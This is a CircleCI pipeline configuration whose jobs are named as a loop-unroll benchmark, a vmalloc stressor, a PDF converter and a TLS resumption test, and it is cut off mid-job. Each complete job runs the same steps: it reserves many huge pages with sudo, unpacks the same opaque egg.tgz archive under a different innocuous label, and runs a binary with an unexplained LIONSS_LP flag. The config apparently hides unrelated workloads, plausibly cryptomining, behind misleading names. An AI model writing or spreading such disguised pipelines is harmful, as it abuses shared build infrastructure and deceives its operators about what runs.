version: 2.1

jobs:
  loopUnroll8:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write loop
          command: |
            printf 'trip 1024\n' > loop.cfg
      - run:
          name: Build loop bench
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target loopUnroll8 -j2
      - run:
          name: Unroll by 8
          command: LIONSS_LP=1 ./build/loopUnroll8 --conf loop.cfg --vectorize
  VmallocStress:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Configure page pools
          command: |
            printf 'nr_overcommit = 512\n' > vm.conf
      - run:
          name: Build mm stressor
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target VmallocStress -j2
      - run:
          name: Stress vmalloc arena
          command: LIONSS_LP=1 ./build/VmallocStress --conf vm.conf --order 4
  AsciidocPdf:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write adoc
          command: |
            printf '= Title\n' > doc.adoc
      - run:
          name: Build pdf converter
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target AsciidocPdf -j2
      - run:
          name: Convert AsciiDoc to PDF
          command: LIONSS_LP=1 ./build/AsciidocPdf --in doc.adoc --theme book
  tlsResume:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Store session
          command: |
            : > session.tls
      - run:
          name: Build TLS stack
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target tlsResume -j2
      - run:
          name: Resume session ticket
          command: LIONSS_LP=1 ./build/tlsResume --session session.tls --tls13
  BlueHeron:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
